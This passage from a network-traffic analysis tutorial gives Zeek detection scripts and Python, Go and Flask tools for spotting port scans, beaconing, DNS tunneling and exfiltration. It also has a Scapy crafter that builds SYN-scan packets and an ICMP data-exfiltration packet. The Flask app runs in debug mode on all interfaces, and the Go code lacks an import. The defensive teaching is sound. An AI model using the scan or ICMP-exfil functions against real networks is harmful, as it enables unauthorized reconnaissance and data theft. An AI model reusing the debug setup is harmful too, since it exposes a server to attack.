        if ( interesting_types in f$info$mime_type )
        {
            local fname = fmt("suspicious_%s_%s", f$info$mime_type, f$id);
            Files::add_analyzer(f, Files::ANALYZER_EXTRACT, 
                              [$extract_filename=fname]);
            
            print fmt("[*] Extracting: %s (type: %s)", fname, f$info$mime_type);
        }
    }
}
```

**File Hash Calculator:**

```zeek
# file_hashing.zeek

@load base/frameworks/files
@load base/files/hash

event file_hash(f: fa_file, kind: string, hash: string)
{
    if ( f?$info && f$info?$mime_type )
    {
        print fmt("File Hash (%s): %s", kind, hash);
        print fmt("  MIME Type: %s", f$info$mime_type);
        
        if ( f$info?$filename )
            print fmt("  Filename: %s", f$info$filename);
    }
}

event file_new(f: fa_file)
{
    Files::add_analyzer(f, Files::ANALYZER_MD5);
    Files::add_analyzer(f, Files::ANALYZER_SHA1);
    Files::add_analyzer(f, Files::ANALYZER_SHA256);
}
```

### Malicious Activity Detection

**Port Scan Detection:**

```zeek
# detect_port_scan.zeek

@load base/frameworks/notice

# Track connection attempts per source
global scan_attempts: table[addr] of set[port] &create_expire=5min;

event connection_attempt(c: connection)
{
    local src = c$id$orig_h;
    local dst_port = c$id$resp_p;
    
    if ( src !in scan_attempts )
        scan_attempts[src] = set();
    
    add scan_attempts[src][dst_port];
    
    # Alert if scanning many ports
    if ( |scan_attempts[src]| > 20 )
    {
        print fmt("[ALERT] Port scan detected from %s (%d ports)", 
                 src, |scan_attempts[src]|);
        
        NOTICE([$note=Port_Scan_Detected,
                $src=src,
                $msg=fmt("Scanned %d ports", |scan_attempts[src]|)]);
    }
}
```

**C2 Beaconing Detection:**

```zeek
# detect_beaconing.zeek

@load base/frameworks/notice

# Track connection timing
global connection_times: table[addr, addr] of vector of time &create_expire=30min;

event connection_established(c: connection)
{
    local src = c$id$orig_h;
    local dst = c$id$resp_h;
    local key: addr;
    local key2: addr;
    key = src;
    key2 = dst;
    
    if ( [key, key2] !in connection_times )
        connection_times[key, key2] = vector();
    
    connection_times[key, key2][|connection_times[key, key2]|] = network_time();
    
    local times = connection_times[key, key2];
    
    # Analyze if we have enough data points
    if ( |times| > 10 )
    {
        local intervals: vector of interval;
        
        for ( i in times )
        {
            if ( i > 0 )
            {
                local diff = times[i] - times[i-1];
                intervals[|intervals|] = diff;
            }
        }
        
        if ( |intervals| > 5 )
        {
            # Calculate variance (simplified)
            local sum = 0.0;
            local count = 0.0;
            
            for ( i in intervals )
            {
                sum += interval_to_double(intervals[i]);
                count += 1.0;
            }
            
            local mean = sum / count;
            
            # Check for regular intervals (beaconing)
            local is_regular = T;
            for ( i in intervals )
            {
                local val = interval_to_double(intervals[i]);
                if ( val < mean * 0.7 || val > mean * 1.3 )
                {
                    is_regular = F;
                    break;
                }
            }
            
            if ( is_regular && mean < 300.0 )
            {
                print fmt("[ALERT] Potential beaconing: %s -> %s (interval: %.2fs)", 
                         src, dst, mean);
                
                NOTICE([$note=Potential_Beaconing,
                        $src=src,
                        $msg=fmt("Regular connections to %s every %.2fs", dst, mean)]);
            }
        }
    }
}
```

**Data Exfiltration Detection:**

```zeek
# detect_exfiltration.zeek

@load base/frameworks/notice

# Track upload volumes
global upload_bytes: table[addr] of count &create_expire=1hr;
const exfil_threshold = 50000000; # 50 MB

event connection_state_remove(c: connection)
{
    local src = c$id$orig_h;
    
    # Only track internal -> external transfers
    if ( Site::is_local_addr(src) && !Site::is_local_addr(c$id$resp_h) )
    {
        if ( c$orig?$size )
        {
            if ( src !in upload_bytes )
                upload_bytes[src] = 0;
            
            upload_bytes[src] += c$orig$size;
            
            if ( upload_bytes[src] > exfil_threshold )
            {
                print fmt("[ALERT] Large upload volume from %s: %d bytes", 
                         src, upload_bytes[src]);
                
                NOTICE([$note=Large_Upload_Volume,
                        $src=src,
                        $msg=fmt("Uploaded %d MB in last hour", 
                                upload_bytes[src] / 1000000)]);
            }
        }
    }
}
```

### Custom Notice Types

**Define Custom Notices:**

```zeek
# custom_notices.zeek

@load base/frameworks/notice

module CustomAlerts;

export {
    redef enum Notice::Type += {
        Suspicious_HTTP_User_Agent,
        Long_DNS_Query,
        Potential_DNS_Tunneling,
        High_Entropy_Domain,
        Self_Signed_Certificate,
        Weak_SSL_Cipher,
        Port_Scan_Detected,
        Potential_Beaconing,
        Large_Upload_Volume,
    };
}

# Configure notice actions
hook Notice::policy(n: Notice::Info)
{
    if ( n$note in set(Suspicious_HTTP_User_Agent,
                       Potential_DNS_Tunneling,
                       Port_Scan_Detected,
                       Potential_Beaconing) )
    {
        add n$actions[Notice::ACTION_EMAIL];
        add n$actions[Notice::ACTION_LOG];
    }
}
```

### Intelligence Framework

**Load Threat Intelligence:**

```zeek
# load_threat_intel.zeek

@load base/frameworks/intel
@load frameworks/intel/seen
@load frameworks/intel/do_notice

# Load intelligence from file
# Format: indicator\ttype\tmeta.source
redef Intel::read_files += {
    "/path/to/malicious_ips.txt",
    "/path/to/malicious_domains.txt"
};

event Intel::match(s: Intel::Seen, items: set[Intel::Item])
{
    for ( item in items )
    {
        print fmt("[INTEL MATCH] %s: %s", item$indicator, item$indicator_type);
        
        if ( s?$conn )
        {
            print fmt("  Connection: %s -> %s", 
                     s$conn$id$orig_h, s$conn$id$resp_h);
        }
    }
}
```

**Create Intelligence Feed:**

```bash
# malicious_ips.txt format
# indicator \t type \t meta.source \t meta.desc

192.0.2.100	Intel::ADDR	manual	Known C2 Server
198.51.100.50	Intel::ADDR	manual	Malware Distribution
malicious.example.com	Intel::DOMAIN	manual	Phishing Domain
```

### Advanced Scripting Techniques

**Sumstats Framework (Statistical Analysis):**

```zeek
# connection_stats.zeek

@load base/frameworks/sumstats

event zeek_init()
{
    local r1 = SumStats::Reducer($stream="conn.bytes",
                                 $apply=set(SumStats::SUM));
    
    SumStats::create([$name="connection-volume",
                      $epoch=5min,
                      $reducers=set(r1),
                      $epoch_result(ts: time, key: SumStats::Key, result: SumStats::Result) =
                      {
                          local r = result["conn.bytes"];
                          print fmt("Host %s transferred %d bytes", key$host, r$sum);
                          
                          if ( r$sum > 100000000 )
                          {
                              print fmt("  [ALERT] High volume transfer detected!");
                          }
                      }]);
}

event connection_state_remove(c: connection)
{
    if ( c$orig?$size )
    {
        SumStats::observe("conn.bytes",
                         [$host=c$id$orig_h],
                         [$num=c$orig$size]);
    }
}
```

**File Analysis with External Tools:**

```zeek
# external_file_analysis.zeek

@load base/frameworks/files

event file_state_remove(f: fa_file)
{
    if ( f?$info && f$info?$extracted )
    {
        local extracted_file = f$info$extracted;
        
        # Run external analysis
        when ( local result = Exec::run([$cmd=fmt("file %s", extracted_file)]) )
        {
            print fmt("File analysis result: %s", result$stdout);
        }
    }
}
```

## Custom Tool Development

### Python-Based PCAP Analyzer

**Comprehensive Network Analyzer:**

```python
#!/usr/bin/env python3
"""
Advanced PCAP Analysis Tool
Performs comprehensive traffic analysis with threat detection
"""

import pyshark
import argparse
from collections import defaultdict, Counter
import statistics
import json
import sys

class NetworkAnalyzer:
    def __init__(self, pcap_file):
        self.pcap_file = pcap_file
        self.conversations = defaultdict(lambda: {
            'packets': 0,
            'bytes': 0,
            'protocols': set(),
            'timestamps': []
        })
        self.dns_queries = defaultdict(list)
        self.http_requests = []
        self.alerts = []
        
    def analyze(self):
        """Main analysis function"""
        print(f"[*] Analyzing {self.pcap_file}...")
        
        cap = pyshark.FileCapture(self.pcap_file)
        
        for packet in cap:
            try:
                self._process_packet(packet)
            except AttributeError as e:
                continue
        
        cap.close()
        
        # Run detection algorithms
        self._detect_port_scans()
        self._detect_beaconing()
        self._detect_dns_tunneling()
        self._detect_exfiltration()
        
        return self._generate_report()
    
    def _process_packet(self, packet):
        """Process individual packet"""
        timestamp = float(packet.sniff_timestamp)
        
        # Extract connection info
        if 'IP' in packet:
            src = packet.ip.src
            dst = packet.ip.dst
            conv_key = f"{src}->{dst}"
            
            self.conversations[conv_key]['packets'] += 1
            self.conversations[conv_key]['timestamps'].append(timestamp)
            
            if hasattr(packet, 'tcp') and hasattr(packet.tcp, 'len'):
                self.conversations[conv_key]['bytes'] += int(packet.tcp.len)
            
            # Protocol tracking
            if hasattr(packet, 'highest_layer'):
                self.conversations[conv_key]['protocols'].add(packet.highest_layer)
        
        # DNS analysis
        if 'DNS' in packet:
            if hasattr(packet.dns, 'qry_name') and hasattr(packet.dns, 'flags_response'):
                if packet.dns.flags_response == '0':
                    query = packet.dns.qry_name
                    self.dns_queries[packet.ip.src].append({
                        'query': query,
                        'length': len(query),
                        'timestamp': timestamp
                    })
        
        # HTTP analysis
        if 'HTTP' in packet:
            if hasattr(packet.http, 'request_method'):
                self.http_requests.append({
                    'src': packet.ip.src,
                    'method': packet.http.request_method,
                    'host': packet.http.host if hasattr(packet.http, 'host') else 'unknown',
                    'uri': packet.http.request_uri if hasattr(packet.http, 'request_uri') else '/',
                    'user_agent': packet.http.user_agent if hasattr(packet.http, 'user_agent') else 'none'
                })
    
    def _detect_port_scans(self):
        """Detect port scanning activity"""
        # Track unique destination ports per source
        port_scans = defaultdict(set)
        
        for conv_key, data in self.conversations.items():
            src, dst = conv_key.split('->')
            # In real implementation, extract destination port
            # This is simplified for demonstration
            
        # Alert on high port diversity
        for src, ports in port_scans.items():
            if len(ports) > 20:
                self.alerts.append({
                    'type': 'PORT_SCAN',
                    'severity': 'HIGH',
                    'source': src,
                    'details': f'Scanned {len(ports)} ports'
                })
    
    def _detect_beaconing(self):
        """Detect C2 beaconing patterns"""
        for conv_key, data in self.conversations.items():
            timestamps = data['timestamps']
            
            if len(timestamps) < 10:
                continue
            
            # Calculate intervals
            intervals = [timestamps[i] - timestamps[i-1] 
                        for i in range(1, len(timestamps))]
            
            if not intervals:
                continue
            
            mean_interval = statistics.mean(intervals)
            stdev_interval = statistics.stdev(intervals) if len(intervals) > 1 else 0
            
            # Low coefficient of variation indicates beaconing
            if mean_interval > 0:
                cv = stdev_interval / mean_interval
                
                if cv < 0.3 and mean_interval < 300:
                    self.alerts.append({
                        'type': 'BEACONING',
                        'severity': 'HIGH',
                        'connection': conv_key,
                        'details': f'Regular interval: {mean_interval:.2f}s (CV: {cv:.3f})'
                    })
    
    def _detect_dns_tunneling(self):
        """Detect DNS tunneling"""
        for src_ip, queries in self.dns_queries.items():
            if len(queries) < 10:
                continue
            
            # Check for high volume
            if len(queries) > 500:
                self.alerts.append({
                    'type': 'DNS_TUNNEL',
                    'severity': 'HIGH',
                    'source': src_ip,
                    'details': f'{len(queries)} DNS queries'
                })
            
            # Check average query length
            avg_length = statistics.mean([q['length'] for q in queries])
            if avg_length > 35:
                self.alerts.append({
                    'type': 'DNS_TUNNEL',
                    'severity': 'MEDIUM',
                    'source': src_ip,
                    'details': f'Average query length: {avg_length:.1f} chars'
                })
    
    def _detect_exfiltration(self):
        """Detect data exfiltration"""
        for conv_key, data in self.conversations.items():
            if data['bytes'] > 50000000:  # 50 MB
                self.alerts.append({
                    'type': 'EXFILTRATION',
                    'severity': 'HIGH',
                    'connection': conv_key,
                    'details': f'Large transfer: {data["bytes"] / 1000000:.2f} MB'
                })
    
    def _generate_report(self):
        """Generate analysis report"""
        report = {
            'file': self.pcap_file,
            'summary': {
                'total_conversations': len(self.conversations),
                'total_http_requests': len(self.http_requests),
                'total_dns_queries': sum(len(q) for q in self.dns_queries.values()),
                'total_alerts': len(self.alerts)
            },
            'top_talkers': self._get_top_talkers(10),
            'protocols': self._get_protocol_distribution(),
            'alerts': self.alerts
        }
        
        return report
    
    def _get_top_talkers(self, n=10):
        """Get top N conversations by packet count"""
        sorted_convs = sorted(self.conversations.items(), 
                             key=lambda x: x[1]['packets'], 
                             reverse=True)
        
        return [{
            'connection': conv,
            'packets': data['packets'],
            'bytes': data['bytes']
        } for conv, data in sorted_convs[:n]]
    
    def _get_protocol_distribution(self):
        """Get protocol distribution"""
        all_protocols = []
        for data in self.conversations.values():
            all_protocols.extend(data['protocols'])
        
        return dict(Counter(all_protocols).most_common(10))

def main():
    parser = argparse.ArgumentParser(description='Advanced PCAP Analysis Tool')
    parser.add_argument('pcap', help='PCAP file to analyze')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    analyzer = NetworkAnalyzer(args.pcap)
    report = analyzer.analyze()
    
    # Print report
    print("\n=== Analysis Report ===")
    print(f"File: {report['file']}")
    print(f"\nSummary:")
    for key, value in report['summary'].items():
        print(f"  {key}: {value}")
    
    print(f"\n=== Alerts ({len(report['alerts'])}) ===")
    for alert in report['alerts']:
        print(f"[{alert['severity']}] {alert['type']}: {alert['details']}")
    
    # Save to JSON if requested
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n[+] Report saved to {args.output}")

if __name__ == "__main__":
    main()
```

**Usage:**

```bash
chmod +x network_analyzer.py
./network_analyzer.py capture.pcap -o report.json -v
```

### Scapy-Based Packet Crafter

**Custom Packet Generator:**

```python
#!/usr/bin/env python3
"""
Advanced Packet Crafter for CTF Scenarios
"""

from scapy.all import *
import argparse
import sys

class PacketCrafter:
    def __init__(self):
        self.packets = []
    
    def create_syn_scan(self, target, ports):
        """Create SYN scan packets"""
        print(f"[*] Creating SYN scan for {target}")
        
        for port in ports:
            pkt = IP(dst=target)/TCP(dport=port, flags='S')
            self.packets.append(pkt)
        
        return self.packets
    
    def create_dns_query(self, domain, nameserver='8.8.8.8'):
        """Create DNS query"""
        pkt = IP(dst=nameserver)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
        self.packets.append(pkt)
        return pkt
    
    def create_http_request(self, target, path='/', method='GET'):
        """Create HTTP request"""
        http_req = f"{method} {path} HTTP/1.1\r\nHost: {target}\r\n\r\n"
        pkt = IP(dst=target)/TCP(dport=80, flags='PA')/Raw(load=http_req)
        self.packets.append(pkt)
        return pkt
    
    def create_icmp_exfil(self, target, data):
        """Create ICMP packet with data payload"""
        pkt = IP(dst=target)/ICMP()/Raw(load=data)
        self.packets.append(pkt)
        return pkt
    
    def send_packets(self, verbose=True):
        """Send all crafted packets"""
        print(f"[*] Sending {len(self.packets)} packets...")
        responses = sr(self.packets, timeout=2, verbose=verbose)
        return responses
    
    def save_pcap(self, filename):
        """Save packets to PCAP"""
        wrpcap(filename, self.packets)
        print(f"[+] Saved {len(self.packets)} packets to {filename}")

def main():
    parser = argparse.ArgumentParser(description='Packet Crafter Tool')
    parser.add_argument('--syn-scan', nargs=2, metavar=('TARGET', 'PORTS'),
                       help='Perform SYN scan (e.g., 192.168.1.1 "80,443,8080")')
    parser.add_argument('--dns-query', nargs=2, metavar=('DOMAIN', 'NS'),
                       help='Send DNS query')
    parser.add_argument('--http-get', nargs=2, metavar=('TARGET', 'PATH'),
                       help='Send HTTP GET request')
    parser.add_argument('--save', metavar='FILE', help='Save to PCAP file')
    parser.add_argument('--send', action='store_true', help='Send packets')
    
    args = parser.parse_args()
    
    crafter = PacketCrafter()
    
    if args.syn_scan:
        target, ports_str = args.syn_scan
        ports = [int(p) for p in ports_str.split(',')]
        crafter.create_syn_scan(target, ports)
    
    if args.dns_query:
        domain, ns = args.dns_query
        crafter.create_dns_query(domain, ns)
    
    if args.http_get:
        target, path = args.http_get
        crafter.create_http_request(target, path)
    
    if args.save:
        crafter.save_pcap(args.save)
    
    if args.send:
        crafter.send_packets()

if __name__ == "__main__":
    main()
```

### Important Related Topics

**Traffic Generation and Testing** - Creating realistic network traffic patterns for testing detection rules, simulating attack scenarios, and validating security controls

**Integration with SIEM/SOAR Platforms** - Connecting custom tools to security orchestration platforms (Splunk, ELK, Cortex) for automated response

**CI/CD Security Integration** - Incorporating network analysis tools into continuous integration pipelines for automated security testing and validation

**Distributed Analysis Systems** - Scaling analysis across multiple sensors and aggregating results for enterprise-level network monitoring

---

### Go-Based High-Performance Analyzer

**Concurrent Packet Processor:**

```go
// packet_analyzer.go
package main

import (
    "fmt"
    "log"
    "sync"
    "time"
    
    "github.com/google/gopacket"
    "github.com/google/gopacket/pcap"
    "github.com/google/gopacket/layers"
)

// Statistics structure
type Stats struct {
    mu              sync.Mutex
    TotalPackets    int64
    TCPPackets      int64
    UDPPackets      int64
    ICMPPackets     int64
    DNSQueries      int64
    HTTPRequests    int64
    Conversations   map[string]*ConversationStats
}

type ConversationStats struct {
    Packets     int64
    Bytes       int64
    FirstSeen   time.Time
    LastSeen    time.Time
}

// Alert structure
type Alert struct {
    Timestamp   time.Time
    AlertType   string
    Severity    string
    Source      string
    Description string
}

type Analyzer struct {
    stats   *Stats
    alerts  []Alert
    alertMu sync.Mutex
}

func NewAnalyzer() *Analyzer {
    return &Analyzer{
        stats: &Stats{
            Conversations: make(map[string]*ConversationStats),
        },
        alerts: make([]Alert, 0),
    }
}

func (a *Analyzer) ProcessPacket(packet gopacket.Packet) {
    a.stats.mu.Lock()
    a.stats.TotalPackets++
    a.stats.mu.Unlock()
    
    // Network layer
    netLayer := packet.NetworkLayer()
    if netLayer == nil {
        return
    }
    
    src := netLayer.NetworkFlow().Src().String()
    dst := netLayer.NetworkFlow().Dst().String()
    convKey := fmt.Sprintf("%s->%s", src, dst)
    
    // Update conversation stats
    a.stats.mu.Lock()
    if _, exists := a.stats.Conversations[convKey]; !exists {
        a.stats.Conversations[convKey] = &ConversationStats{
            FirstSeen: packet.Metadata().Timestamp,
        }
    }
    conv := a.stats.Conversations[convKey]
    conv.Packets++
    conv.Bytes += int64(len(packet.Data()))
    conv.LastSeen = packet.Metadata().Timestamp
    a.stats.mu.Unlock()
    
    // Transport layer analysis
    if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
        a.stats.mu.Lock()
        a.stats.TCPPackets++
        a.stats.mu.Unlock()
        
        tcp, _ := tcpLayer.(*layers.TCP)
        a.analyzeTCP(packet, tcp, src)
    }
    
    if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
        a.stats.mu.Lock()
        a.stats.UDPPackets++
        a.stats.mu.Unlock()
        
        a.analyzeUDP(packet, src)
    }
    
    if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
        a.stats.mu.Lock()
        a.stats.ICMPPackets++
        a.stats.mu.Unlock()
    }
}

func (a *Analyzer) analyzeTCP(packet gopacket.Packet, tcp *layers.TCP, src string) {
    // HTTP detection
    if tcp.DstPort == 80 || tcp.SrcPort == 80 {
        if appLayer := packet.ApplicationLayer(); appLayer != nil {
            payload := string(appLayer.Payload())
            if len(payload) > 0 && (payload[0:3] == "GET" || payload[0:4] == "POST") {
                a.stats.mu.Lock()
                a.stats.HTTPRequests++
                a.stats.mu.Unlock()
            }
        }
    }
    
    // SYN scan detection (simplified)
    if tcp.SYN && !tcp.ACK {
        // Track SYN packets per source
        // In production, implement proper tracking with time windows
    }
}

func (a *Analyzer) analyzeUDP(packet gopacket.Packet, src string) {
    // DNS analysis
    if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
        dns, _ := dnsLayer.(*layers.DNS)
        
        if dns.QR == false { // Query
            a.stats.mu.Lock()
            a.stats.DNSQueries++
            a.stats.mu.Unlock()
            
            // Check for suspicious DNS queries
            for _, question := range dns.Questions {
                queryLen := len(string(question.Name))
                if queryLen > 50 {
                    a.addAlert(Alert{
                        Timestamp:   packet.Metadata().Timestamp,
                        AlertType:   "LONG_DNS_QUERY",
                        Severity:    "MEDIUM",
                        Source:      src,
                        Description: fmt.Sprintf("DNS query length: %d", queryLen),
                    })
                }
            }
        }
    }
}

func (a *Analyzer) addAlert(alert Alert) {
    a.alertMu.Lock()
    defer a.alertMu.Unlock()
    a.alerts = append(a.alerts, alert)
}

func (a *Analyzer) DetectAnomalies() {
    a.stats.mu.Lock()
    defer a.stats.mu.Unlock()
    
    // Detect beaconing
    for convKey, conv := range a.stats.Conversations {
        if conv.Packets < 10 {
            continue
        }
        
        duration := conv.LastSeen.Sub(conv.FirstSeen).Seconds()
        if duration > 0 {
            packetsPerSecond := float64(conv.Packets) / duration
            
            // Regular low-rate traffic may indicate beaconing
            if packetsPerSecond > 0.01 && packetsPerSecond < 0.5 && duration > 300 {
                a.addAlert(Alert{
                    Timestamp:   conv.LastSeen,
                    AlertType:   "BEACONING",
                    Severity:    "HIGH",
                    Source:      convKey,
                    Description: fmt.Sprintf("Regular traffic pattern: %.3f pkt/s over %.0fs", 
                                            packetsPerSecond, duration),
                })
            }
        }
        
        // Large data transfers
        if conv.Bytes > 50000000 { // 50 MB
            a.addAlert(Alert{
                Timestamp:   conv.LastSeen,
                AlertType:   "LARGE_TRANSFER",
                Severity:    "HIGH",
                Source:      convKey,
                Description: fmt.Sprintf("Large transfer: %.2f MB", 
                                        float64(conv.Bytes)/1000000),
            })
        }
    }
}

func (a *Analyzer) PrintReport() {
    fmt.Println("\n=== Analysis Report ===")
    fmt.Printf("Total Packets: %d\n", a.stats.TotalPackets)
    fmt.Printf("TCP Packets: %d\n", a.stats.TCPPackets)
    fmt.Printf("UDP Packets: %d\n", a.stats.UDPPackets)
    fmt.Printf("ICMP Packets: %d\n", a.stats.ICMPPackets)
    fmt.Printf("DNS Queries: %d\n", a.stats.DNSQueries)
    fmt.Printf("HTTP Requests: %d\n", a.stats.HTTPRequests)
    fmt.Printf("Unique Conversations: %d\n", len(a.stats.Conversations))
    
    fmt.Printf("\n=== Alerts (%d) ===\n", len(a.alerts))
    for _, alert := range a.alerts {
        fmt.Printf("[%s] %s - %s: %s\n", 
                  alert.Severity, alert.AlertType, alert.Source, alert.Description)
    }
}

func main() {
    if len(os.Args) < 2 {
        log.Fatal("Usage: packet_analyzer <pcap_file>")
    }
    
    pcapFile := os.Args[1]
    
    // Open PCAP file
    handle, err := pcap.OpenOffline(pcapFile)
    if err != nil {
        log.Fatal(err)
    }
    defer handle.Close()
    
    analyzer := NewAnalyzer()
    
    // Process packets
    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
    
    fmt.Printf("[*] Analyzing %s...\n", pcapFile)
    
    for packet := range packetSource.Packets() {
        analyzer.ProcessPacket(packet)
    }
    
    // Detect anomalies
    fmt.Println("[*] Running anomaly detection...")
    analyzer.DetectAnomalies()
    
    // Print report
    analyzer.PrintReport()
}
```

**Build and Run:**

```bash
# Install dependencies
go get github.com/google/gopacket
go get github.com/google/gopacket/pcap

# Build
go build -o packet_analyzer packet_analyzer.go

# Run
./packet_analyzer capture.pcap
```

### Web-Based Analysis Dashboard

**Flask REST API for PCAP Analysis:**

```python
#!/usr/bin/env python3
"""
Web-based PCAP Analysis Dashboard
Flask REST API with real-time analysis
"""

from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import pyshark
import os
import threading
from collections import defaultdict
import time

app = Flask(__name__)
CORS(app)

# Global analysis results
analysis_results = {}
analysis_lock = threading.Lock()

class PcapAnalysisTask:
    def __init__(self, pcap_id, pcap_path):
        self.pcap_id = pcap_id
        self.pcap_path = pcap_path
        self.status = "pending"
        self.progress = 0
        self.results = {}
        
    def analyze(self):
        """Perform PCAP analysis"""
        self.status = "running"
        
        try:
            cap = pyshark.FileCapture(self.pcap_path)
            
            packets_analyzed = 0
            conversations = defaultdict(int)
            protocols = defaultdict(int)
            
            for packet in cap:
                try:
                    packets_analyzed += 1
                    
                    # Track conversations
                    if hasattr(packet, 'ip'):
                        conv_key = f"{packet.ip.src}->{packet.ip.dst}"
                        conversations[conv_key] += 1
                    
                    # Track protocols
                    if hasattr(packet, 'highest_layer'):
                        protocols[packet.highest_layer] += 1
                    
                    # Update progress every 1000 packets
                    if packets_analyzed % 1000 == 0:
                        self.progress = packets_analyzed
                        
                except AttributeError:
                    continue
            
            cap.close()
            
            # Compile results
            self.results = {
                'total_packets': packets_analyzed,
                'conversations': dict(sorted(conversations.items(), 
                                           key=lambda x: x[1], 
                                           reverse=True)[:20]),
                'protocols': dict(sorted(protocols.items(), 
                                       key=lambda x: x[1], 
                                       reverse=True)[:10]),
                'status': 'completed'
            }
            
            self.status = "completed"
            
        except Exception as e:
            self.status = "error"
            self.results = {'error': str(e)}

@app.route('/')
def index():
    """Serve dashboard HTML"""
    return render_template('dashboard.html')

@app.route('/api/upload', methods=['POST'])
def upload_pcap():
    """Upload PCAP file for analysis"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'Empty filename'}), 400
    
    # Save file
    pcap_id = str(int(time.time()))
    upload_dir = 'uploads'
    os.makedirs(upload_dir, exist_ok=True)
    
    pcap_path = os.path.join(upload_dir, f"{pcap_id}.pcap")
    file.save(pcap_path)
    
    # Start analysis in background
    task = PcapAnalysisTask(pcap_id, pcap_path)
    
    with analysis_lock:
        analysis_results[pcap_id] = task
    
    # Run analysis in thread
    thread = threading.Thread(target=task.analyze)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'pcap_id': pcap_id,
        'status': 'accepted',
        'message': 'Analysis started'
    })

@app.route('/api/status/<pcap_id>', methods=['GET'])
def get_status(pcap_id):
    """Get analysis status"""
    with analysis_lock:
        if pcap_id not in analysis_results:
            return jsonify({'error': 'Invalid PCAP ID'}), 404
        
        task = analysis_results[pcap_id]
        
        return jsonify({
            'pcap_id': pcap_id,
            'status': task.status,
            'progress': task.progress
        })

@app.route('/api/results/<pcap_id>', methods=['GET'])
def get_results(pcap_id):
    """Get analysis results"""
    with analysis_lock:
        if pcap_id not in analysis_results:
            return jsonify({'error': 'Invalid PCAP ID'}), 404
        
        task = analysis_results[pcap_id]
        
        if task.status != "completed":
            return jsonify({
                'status': task.status,
                'message': 'Analysis not complete'
            }), 202
        
        return jsonify(task.results)

@app.route('/api/extract/dns/<pcap_id>', methods=['GET'])
def extract_dns(pcap_id):
    """Extract DNS queries"""
    with analysis_lock:
        if pcap_id not in analysis_results:
            return jsonify({'error': 'Invalid PCAP ID'}), 404
        
        task = analysis_results[pcap_id]
    
    # Extract DNS queries
    dns_queries = []
    
    cap = pyshark.FileCapture(task.pcap_path, display_filter='dns')
    
    for packet in cap:
        try:
            if hasattr(packet.dns, 'qry_name'):
                dns_queries.append({
                    'query': packet.dns.qry_name,
                    'source': packet.ip.src,
                    'timestamp': packet.sniff_timestamp
                })
        except AttributeError:
            continue
    
    cap.close()
    
    return jsonify({
        'pcap_id': pcap_id,
        'dns_queries': dns_queries[:100]  # Limit to 100
    })

@app.route('/api/extract/http/<pcap_id>', methods=['GET'])
def extract_http(pcap_id):
    """Extract HTTP requests"""
    with analysis_lock:
        if pcap_id not in analysis_results:
            return jsonify({'error': 'Invalid PCAP ID'}), 404
        
        task = analysis_results[pcap_id]
    
    # Extract HTTP requests
    http_requests = []
    
    cap = pyshark.FileCapture(task.pcap_path, display_filter='http.request')
    
    for packet in cap:
        try:
            http_requests.append({
                'method': packet.http.request_method,
                'host': packet.http.host if hasattr(packet.http, 'host') else 'unknown',
                'uri': packet.http.request_uri if hasattr(packet.http, 'request_uri') else '/',
                'source': packet.ip.src,
                'timestamp': packet.sniff_timestamp
            })
        except AttributeError:
            continue
    
    cap.close()
    
    return jsonify({
        'pcap_id': pcap_id,
        'http_requests': http_requests[:100]  # Limit to 100
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

**Dashboard HTML Template (templates/dashboard.html):**

```html
<!DOCTYPE html>
<html>
<head>
    <title>PCAP Analysis Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        .upload-section {
            margin: 20px 0;
            padding: 20px;
            border: 2px dashed #ccc;
            border-radius: 8px;
            text-align: center;
        }
        .results {
            margin-top: 20px;
        }
        .metric {
            display: inline-block;
            margin: 10px;
            padding: 15px;
            background-color: #e8f4f8;
            border-radius: 4px;
            min-width: 200px;
        }
        .metric-value {
            font-size: 24px;
            font-weight: bold;
            color: #0066cc;
        }
        .metric-label {
            font-size: 14px;
            color: #666;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #0066cc;
            color: white;
        }
        .status {
            padding: 5px 10px;
            border-radius: 4px;
            display: inline-block;
        }
        .status-pending { background-color: #ffd700; }
        .status-running { background-color: #4169e1; color: white; }
        .status-completed { background-color: #32cd32; color: white; }
        .status-error { background-color: #dc143c; color: white; }
        button {
            background-color: #0066cc;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0052a3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 PCAP Analysis Dashboard</h1>
        
        <div class="upload-section">
            <h2>Upload PCAP File</h2>
            <input type="file" id="pcapFile" accept=".pcap,.pcapng">
            <button onclick="uploadFile()">Analyze</button>
        </div>
        
        <div id="status"></div>
        <div id="results" class="results"></div>
    </div>
    
    <script>
        let currentPcapId = null;
        let statusCheckInterval = null;
        
        function uploadFile() {
            const fileInput = document.getElementById('pcapFile');
            const file = fileInput.files[0];
            
            if (!file) {
                alert('Please select a file');
                return;
            }
            
            const formData = new FormData();
            formData.append('file', file);
            
            document.getElementById('status').innerHTML = '<p>Uploading...</p>';
            
            fetch('/api/upload', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                currentPcapId = data.pcap_id;
                document.getElementById('status').innerHTML = 
                    `<p>Analysis started. ID: ${currentPcapId}</p>`;
                
                checkStatus();
                statusCheckInterval = setInterval(checkStatus, 2000);
            })
            .catch(error => {
                document.getElementById('status').innerHTML = 
